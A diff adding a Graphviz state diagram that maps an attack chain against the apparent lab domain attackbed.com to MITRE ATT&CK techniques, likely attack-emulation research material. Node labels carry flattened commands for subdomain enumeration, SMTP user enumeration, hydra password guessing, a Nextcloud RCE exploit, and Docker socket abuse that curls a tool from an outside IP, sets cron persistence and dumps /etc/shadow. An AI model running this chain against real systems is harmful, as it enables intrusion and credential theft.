@@ -1,0 +1,78 @@
+// Commands State Diagram
+digraph {
+	rankdir=TB
+	1 [label="1: dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com
+T1590.002: Gather Victim Network Information: DNS
+T1591: Gather Victim Org Information
+{'reconnaissance'}
+" shape=box style=rounded]
+	2 [label="2: __smtp_user_enum_pl___M_VRFY__U_smtp_user_txt__t_mail_attackbed_com
+T1589.002: Gather Victim Identity Information: Email Addresses
+{'reconnaissance'}
+" shape=box style=rounded]
+	3 [label="3: hydra__l__alice_attackbed_com___P_smtp_pass_txt__c_5__s_143_mail_attackbed_com_imap
+T1078.002: Valid Accounts: Domain Accounts
+T1110.001: Brute Force: Password Guessing
+T1133: External Remote Services
+{'initial-access', 'credential-access', 'persistence', 'privilege-escalation', 'defense-evasion'}
+" shape=box style=rounded]
+	4 [label="4: GET
+T1592.002: Gather Victim Host Information: Software
+{'reconnaissance'}
+" shape=box style=rounded]
+	5 [label="5: start_https_listener
+T1071.001: Application Layer Protocol: Web Protocols
+T1573.001: Encrypted Channel: Symmetric Cryptography
+{'command-and-control'}
+" shape=box style=rounded]
+	6 [label="6: exploit_unix_webapp_nextcloud_workflows_rce
+T1190: Exploit Public-Facing Application
+T1059.004: Command and Scripting Interpreter: Unix Shell
+T1095: Non-Application Layer Protocol
+{'initial-access', 'command-and-control', 'execution'}
+" shape=box style=rounded]
+	7 [label="7: getuid
+T1033: System Owner/User Discovery
+{'discovery'}
+" shape=box style=rounded]
+	8 [label="8: docker__H_tcp___localhost_1090_ps
+T1057: Process Discovery
+{'discovery'}
+" shape=box style=rounded]
+	9 [label="9: docker__H_tcp___localhost_1090_network_list
+T1016: System Network Configuration Discovery
+{'discovery'}
+" shape=box style=rounded]
+	10 [label="10: docker__H_tcp___localhost_1090_run___rm__t__u_root___network_nextcloud_default__v__etc_etc__kalilinux_kali_rolling_bash__c__echo_____5_________root_test__e_tool____curl_http___192_42_1_174_8888_tool___tool____chmod__x_tool____tool_____etc_cron_d_sysvz
+T1610: Deploy Container
+T1525: Implant Internal Image
+T1053.003: Scheduled Task/Job: Cron
+T1210: Exploitation of Remote Services
+{'persistence', 'privilege-escalation', 'execution', 'defense-evasion', 'lateral-movement'}
+" shape=box style=rounded]
+	11 [label="11: ls
+T1083: File and Directory Discovery
+{'discovery'}
+" shape=box style=rounded]
+	12 [label="12: ps
+T1057: Process Discovery
+{'discovery'}
+" shape=box style=rounded]
+	13 [label="13: download
+T1003.008: OS Credential Dumping: /etc/passwd and /etc/shadow
+T1041: Exfiltration Over C2 Channel
+{'credential-access', 'exfiltration'}
+" shape=box style=rounded]
+	11 -> 12
+	5 -> 6
+	3 -> 4
+	10 -> 11
+	1 -> 2
+	12 -> 13
+	6 -> 7
+	7 -> 8
+	2 -> 3
+	4 -> 5
+	9 -> 10
+	8 -> 9
+}
